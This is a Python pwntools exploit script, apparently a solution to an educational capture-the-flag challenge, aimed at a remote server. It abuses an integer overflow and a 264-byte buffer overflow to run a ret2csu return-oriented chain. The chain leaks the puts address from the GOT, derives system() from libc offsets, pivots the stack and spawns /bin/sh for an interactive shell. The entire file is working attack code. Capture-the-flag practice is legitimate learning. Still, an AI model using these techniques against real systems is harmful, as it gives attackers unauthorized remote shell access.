from pwn import *

#r = remote("127.0.0.1", 12341)
r = remote("eductf.zoolab.org", 10105)
context.arch = 'amd64'
input("")
length = 0x7fffffff + 1
r.sendlineafter(": ", str(length))
offset = 264
csu_reset = 0x40086a
csu_head = 0x400850
csu_call = 0x400859
place = 0x601400
pop_rsp_pop3_ret = 0x40086d
puts_got = 0x601018
read_got = 0x601028
pop_rdi_ret = 0x400873
ret = 0x400294

payload = flat([csu_reset])
payload +=  flat([0, 1, puts_got, 0, 0, 0, pop_rdi_ret, puts_got, csu_call])
payload += flat([0, 0, 1, read_got, 0, place+0x200, 0x200, csu_head, 0])
payload += flat([0, 0, 0, 0, 0, 0, pop_rsp_pop3_ret, place+0x200])

r.sendlineafter(":)", b"a" * 264 + payload)

r.recvline()
puts_got_leak = r.recv()[:6] + b'\x00\x00'
puts_pos = u64(puts_got_leak)
print("puts_pos :", end='')
print(hex(puts_pos))
sys_pos = puts_pos - 0x809c0 + 0x4f440
#sys_pos = puts_pos - 0x2a300
print(hex(sys_pos))
payload =  flat([0, 0, 0, ret, csu_reset])
payload += flat([0, 1, place+0x200+0x60, place+0x200+0x68, 0, 0, csu_head, sys_pos, "/bin/sh\x00"])

r.send(payload)

r.interactive()

